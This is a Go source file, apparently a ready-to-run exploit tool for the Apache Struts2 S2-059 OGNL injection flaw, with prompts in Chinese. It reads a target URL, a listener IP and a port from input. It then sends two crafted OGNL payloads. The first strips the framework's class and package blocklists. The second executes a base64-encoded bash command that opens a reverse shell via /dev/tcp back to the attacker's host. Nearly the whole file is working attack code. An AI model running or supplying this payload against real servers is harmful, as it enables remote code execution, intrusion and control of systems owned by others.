package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"os"
)

func S2_059() {
	fmt.Println("[*] s2_059 test starting")
	fmt.Println("[*] url输入如: http://0.0.0.0:8080/?id=")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Println("[*] 输入url:")
	url4, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	url1 := string(url4)
	reader2 := bufio.NewReader(os.Stdin)
	fmt.Println("[*] 输入反弹shell的IP:")
	ip, _, err2 := reader2.ReadLine()
	if err2 != nil {
		panic(err2)
	}
	reader3 := bufio.NewReader(os.Stdin)
	fmt.Println("[*] 输入反弹shell的端口:")
	port, _, err3 := reader3.ReadLine()
	if err2 != nil {
		panic(err3)
	}
	payload1 := "%25{(%23context%3d%23attr['struts.valueStack'].context).(%23container%3d%23context['com.opensymphony.xwork2.ActionContext.container']).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.setExcludedClasses('')).(%23ognlUtil.setExcludedPackageNames(''))}"
	shell := fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port))))
	payload2 := "%" + fmt.Sprintf("{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('%s'))}", shell)
	payload2 = url.QueryEscape(payload2)
	url2 := url1 + payload1
	rep1, _ := http.Get(url2)
	fmt.Println(rep1.Status)
	url3 := url1 + payload2
	rep2, _ := http.Get(url3)
	fmt.Println(rep2.Status)
}
